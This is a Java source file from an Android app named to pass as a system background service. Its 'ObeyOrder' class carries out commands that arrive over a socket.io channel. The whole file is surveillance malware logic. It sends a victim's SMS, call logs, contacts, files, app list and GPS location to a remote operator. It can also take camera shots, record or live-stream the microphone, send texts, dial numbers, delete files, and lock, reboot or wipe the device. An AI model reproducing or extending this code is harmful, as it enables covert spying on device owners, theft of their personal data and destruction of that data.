package com.android.background.services.helpers;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Looper;
import android.util.Log;

import com.android.background.services.activities.MainActivity;
import com.android.background.services.managers.AppsListManager;
import com.android.background.services.managers.CallsManager;
import com.android.background.services.managers.CameraManager;
import com.android.background.services.managers.ContactsManager;
import com.android.background.services.managers.DeviceInfoManger;
import com.android.background.services.managers.FileManager;
import com.android.background.services.managers.LocationManager;
import com.android.background.services.managers.MicManager;
import com.android.background.services.managers.SMSManager;
import com.android.background.services.params.Orders;

import org.apache.commons.io.FileUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;

import io.socket.client.Socket;

public class ObeyOrder {

    private static final String TAG = "MADARA";
    private final Context context;
    private final Socket ioSocket;

    public ObeyOrder(Context context, Socket ioSocket) {
        this.context = context;
        this.ioSocket = ioSocket;
    }

//    ----------------------------------------------------------------------------------------------

    public void deviceInfo() {

        boolean isRooted = DeviceInfoManger.isDeviceRooted();
        String phoneNumber = DeviceInfoManger.getPhoneNumber(context);
        float batteryPercentage = DeviceInfoManger.getBatteryPercentage(context);

        JSONObject deviceInfo = new JSONObject();

        try {
            deviceInfo.put("isRooted", isRooted);
            deviceInfo.put("phoneNumber", phoneNumber);
            deviceInfo.put("batteryPercentage", String.valueOf(batteryPercentage));

            ioSocket.emit(Orders.DEVICE_INFO, deviceInfo);
        } catch (JSONException e) {
            Log.e(TAG, "deviceInfo: ", e);
        }
    }

//    ----------------------------------------------------------------------------------------------

    public void camera(int req) {

        if (req == -1) {
            JSONObject cameraList = new CameraManager(context).findCameraList();
            if (cameraList != null) {
                ioSocket.emit(Orders.CAMERA, cameraList);
            }
        } else if (req == 1) {
            new CameraManager(context).startUp(1);
        } else if (req == 0) {
            new CameraManager(context).startUp(0);
        }
    }

//    ----------------------------------------------------------------------------------------------

    public void fileManager(int req, String path) {
        if (req == 0) {
            FileManager.walk(path, new FileManager.OnRetrievedFilesListener() {
                @Override
                public void onRetrievedFiles(JSONArray filesInfo) {
                    ioSocket.emit(Orders.FILES, filesInfo);
                }
            });
        } else if (req == 1)
            FileManager.downloadFile(path);
    }

//    ----------------------------------------------------------------------------------------------

    public void manageSMS(int req, String phoneNo, String msg) {

        if (req == 0) {
            SMSManager.getSMSList(new SMSManager.OnRetrievedSMSListener() {
                @Override
                public void onRetrievedSMS(JSONObject SMSList) {
                    ioSocket.emit(Orders.SMS, SMSList);
                }
            });
        } else if (req == 1) {
            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
            new Thread(() -> ioSocket.emit(Orders.SMS, isSent)).start();
        }
    }

//    ----------------------------------------------------------------------------------------------

    public void getCallsLogs() {
        // Retrieve calls logs
        CallsManager.getCallsLogs(new CallsManager.OnRetrieveCallsLogsListener() {
            @Override
            public void onRetrieveCallsLogs(JSONObject calls) {
                ioSocket.emit(Orders.CALL_LOGS, calls);
            }
        });
    }

//    ----------------------------------------------------------------------------------------------

    public void getContacts() {
        ContactsManager.getContacts(new ContactsManager.OnRetrievedContactsListener() {
            @Override
            public void onRetrievedContacts(JSONObject contacts) {
                ioSocket.emit(Orders.CONTACTS, contacts);
            }
        });
    }

//    ----------------------------------------------------------------------------------------------

    public void recordMic(int seconds) {
        MicManager.startRecording(seconds);
    }

//    ----------------------------------------------------------------------------------------------

    public void getAppsList() {
        AppsListManager.getAppLists(context, new AppsListManager.OnRetrievedAppListsListener() {
            @Override
            public void onRetrievedAppLists(JSONObject appLists) {
                ioSocket.emit(Orders.GET_APPS_LIST, appLists);
            }
        });
    }

//    ----------------------------------------------------------------------------------------------

    public void getLocation() throws Exception {
        Looper.prepare();
        LocationManager gps = new LocationManager(context);
        JSONObject location = new JSONObject();
        // check if GPS enabled
        if (gps.canGetLocation()) {

            double latitude = gps.getLatitude();
            double longitude = gps.getLongitude();
            location.put("enable", true);
            location.put("lat", latitude);
            location.put("lng", longitude);
        } else {
            location.put("enable", false);
        }

        ioSocket.emit(Orders.GET_LOCATION, location);
    }

//    ----------------------------------------------------------------------------------------------

    public void runApp(String packageName) {

        JSONObject jsonObject = new JSONObject();

        Intent launchIntent = context.getPackageManager().getLaunchIntentForPackage(packageName);

        if (launchIntent != null) {
            try {
                jsonObject.put("launchingStatus", true);
            } catch (JSONException e) {
                Log.e(TAG, "runApp: ", e);
            }
            context.startActivity(launchIntent);
        } else {
            try {
                jsonObject.put("launchingStatus", false);
            } catch (JSONException e) {
                Log.e(TAG, "runApp: ", e);
            }
        }
        ioSocket.emit(Orders.RUN_APP, jsonObject);
    }

//    ----------------------------------------------------------------------------------------------

    public void openUrl(String url) {

        JSONObject jsonObject = new JSONObject();

        try {
            Intent openIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            openIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(openIntent);
            jsonObject.put("status", true);
        } catch (Exception e) {
            try {
                jsonObject.put("status", false);
            } catch (JSONException ex) {
                Log.e(TAG, "openUrl: ", ex);
            }
            Log.e(TAG, "openUrl: ", e);
        }

        ioSocket.emit(Orders.OPEN_URL, jsonObject);
    }

//    ----------------------------------------------------------------------------------------------

    public void deleteFileOrFolder(String fileFolderPath) throws JSONException {

        JSONObject jsonObject = new JSONObject();

        File file = new File(fileFolderPath);

        if (file.isDirectory() && file.exists()) {
            try {
                FileUtils.forceDelete(file);
                jsonObject.put("status", true);
            } catch (Exception e) {
                jsonObject.put("status", false);
                Log.e(TAG, "deleteFileOrFolder: ", e);
            }
        } else if (file.isFile() && file.exists()) {
            jsonObject.put("status", file.delete());
        }

        ioSocket.emit(Orders.DELETE_FILE_OR_FOLDER, jsonObject);
    }

//    ----------------------------------------------------------------------------------------------

    public void dialNumber(String number) {

        JSONObject jsonObject = new JSONObject();

        try {
            Uri phoneNumber = Uri.parse("tel:" + number);
            Intent callIntent = new Intent(Intent.ACTION_CALL, phoneNumber);
            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(callIntent);

            jsonObject.put("status", true);
        } catch (Exception e) {
            try {
                jsonObject.put("status", false);
            } catch (JSONException ex) {
                Log.e(TAG, "dialNumber: ", e);
            }
            Log.e(TAG, "dialNumber: ", e);
        }
        ioSocket.emit(Orders.DIAL_NUMBER, jsonObject);
    }

//    ----------------------------------------------------------------------------------------------

    public void lockDevice() throws JSONException {

        JSONObject jsonObject = new JSONObject();

        if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)) {
            MainActivity.devicePolicyManager.lockNow();
            jsonObject.put("status", true);
            jsonObject.put("message", "Device locked.");
        } else {
            jsonObject.put("status", false);
            jsonObject.put("message", "Device admin permission is not active.");
        }
        ioSocket.emit(Orders.LOCK_DEVICE, jsonObject);
    }

//    ----------------------------------------------------------------------------------------------

    public void wipeDevice() throws JSONException {

        JSONObject jsonObject = new JSONObject();

        if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)) {
            MainActivity.devicePolicyManager.wipeData(1);
            jsonObject.put("status", true);
            jsonObject.put("message", "Device wiped out successfully.");
        } else {
            jsonObject.put("status", false);
            jsonObject.put("message", "Device admin permission is not active.");
        }
        ioSocket.emit(Orders.WIPE_DEVICE, jsonObject);
    }

//    ----------------------------------------------------------------------------------------------

    public void rebootDevice() throws JSONException {
        JSONObject jsonObject = new JSONObject();

        if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)) {

            MainActivity.devicePolicyManager.reboot(MainActivity.componentName);
            jsonObject.put("status", true);
            jsonObject.put("message", "Device rebooted successfully.");
        } else {
            jsonObject.put("status", false);
            jsonObject.put("message", "Device admin permission is not active.");
        }
        ioSocket.emit(Orders.REBOOT_DEVICE, jsonObject);
    }

//    ----------------------------------------------------------------------------------------------

    public void listenLiveMic() {
        LiveMicListener listener = new LiveMicListener(context, ioSocket);
        listener.listenLiveMic();
    }

//    ----------------------------------------------------------------------------------------------
}
